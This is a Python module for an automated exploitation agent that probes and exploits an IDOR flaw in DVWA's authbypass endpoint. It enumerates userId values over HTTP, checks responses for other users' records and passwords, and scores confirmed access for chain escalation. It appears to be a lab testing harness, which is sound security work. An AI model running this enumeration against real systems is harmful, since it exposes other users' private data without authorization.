"""Access Control IDOR agent with real HTTP execution."""

from __future__ import annotations

import logging
import json
import re
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier
from agents.access_control.session import open_access_control_session, permission_evidence_fields, user_object_id

logger = logging.getLogger(__name__)

AGENT_ID = "ac_idor"
MODULE_PATH = "/vulnerabilities/authbypass/get_user_data.php"
_PROBE_OBSERVATION_KEY = "object_ids_enumerable"

# Signals indicating the response contains user-specific data
_DATA_SIGNALS = [
    "admin", "gordonb", "pablo", "smithy",
    "first name", "surname", "user id",
    "password",
]


def _contains_target_record(body: str, user_id: str) -> bool:
    """Require the requested user record, rather than generic page visibility."""
    try:
        decoded = json.loads(body)
    except (TypeError, ValueError):
        decoded = None
    rows = decoded if isinstance(decoded, list) else [decoded] if isinstance(decoded, dict) else []
    for row in rows:
        if not isinstance(row, dict):
            continue
        identifier = next((str(row[key]) for key in ("user_id", "userId", "id") if row.get(key) is not None), None)
        text = " ".join(str(value) for value in row.values()).lower()
        if identifier == str(user_id) and (user_id != "1" or "admin" in text):
            return True
    # Some DVWA fixture variants return the row in HTML rather than JSON.
    if user_id == "1" and re.search(r"(?:user\s*id|user_id|id)\s*[:=\" ]+1\b.{0,160}\badmin\b|\badmin\b.{0,160}(?:user\s*id|user_id|id)\s*[:=\" ]+1\b", body, re.I | re.S):
        return True
    return False


def _probe_preconditions(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Enumerate predictable object IDs to detect IDOR.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    verifier = Verifier()

    sent_any = False
    responses: list[tuple[str, str, int]] = []  # (payload, text, length)
    for payload in payloads:
        if payload in already_tried:
            continue
        sent_any = True
        try:
            test_id = payload.strip()
            if test_id == "1":
                continue
            tried.append(payload)
            resp = session.get(MODULE_PATH, params={"userId": test_id})
            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, False,
                endpoint=MODULE_PATH, response=resp))
            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
                session._initial_session_fingerprint, object_id=user_object_id(test_id)))
            if resp.status_code == 200:
                responses.append((test_id, resp.text, len(resp.text)))
                records_visible = bool(_parse_records(resp.text))
                if records_visible or verifier.contains_any(resp.text, _DATA_SIGNALS).ok:
                    events[-1]["payload"].update(signal_detected=True, verified_grade=1,
                        verification_reason="verified_probe_precondition")
                    observations[_PROBE_OBSERVATION_KEY] = True
                    return True, tried, observations, events
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, f"userId={payload}", None, False))

    if not sent_any:
        return False, tried, {}, events
    observations[_PROBE_OBSERVATION_KEY] = False
    return False, tried, observations, events


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[int, list[str], list[str], list[dict]]:
    """Confirm unauthorized data access. Returns (score, tried, confirmed_vulns, events)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    score = 0
    verifier = Verifier()

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        try:
            test_id = payload.strip()
            resp = session.get(MODULE_PATH, params={"userId": test_id})
            visible = resp.status_code == 200 and _contains_target_record(resp.text, test_id)
            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, visible,
                endpoint=MODULE_PATH, response=resp))
            events[-1]["payload"].update(permission_evidence_fields(session, session._principal_id,
                session._initial_session_fingerprint, object_id=user_object_id(test_id),
                consumed_source_evidence_id=getattr(session, "_consumed_source_evidence_id", None)))
            if visible:
                events[-1]["payload"].update(signal_detected=True, verified_grade=3,
                    verification_reason="verified_permission_candidate")
                score = max(score, 3)
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                break
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, f"userId={payload}", None, False))

    return score, tried, confirmed, events

def ac_idor_agent(state: ExploitationState) -> dict[str, Any]:
    """Execute the IDOR static method agent for access-control testing.

    Reads validated object-id candidates, discovered endpoints, session
    configuration, existing observations, and tried payload memory. The agent
    probes object-id enumerability, attempts unauthorized object access over
    HTTP, confirms `ac_idor_confirmed` on access evidence, and runs shared
    chain scoring when the method succeeds.

    Args:
        state: Current shared LangGraph state.

    Returns:
        Partial state update for observations, tried payloads, scores,
        confirmed vulnerabilities, achieved outcomes, and telemetry events.
    """
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = None
    try:
        session, principal, initial_fingerprint, consumed_source_evidence_id = open_access_control_session(
            state, AGENT_ID, security_level)
        session._principal_id = principal
        session._initial_session_fingerprint = initial_fingerprint
        session._consumed_source_evidence_id = consumed_source_evidence_id

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe")
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit")

        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried)
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        if session is not None:
            session.close()


def _parse_records(body: str) -> list[dict]:
    try:
        rows = json.loads(body)
    except (TypeError, ValueError):
        return []
    return [row for row in rows if isinstance(row, dict)] if isinstance(rows, list) else []
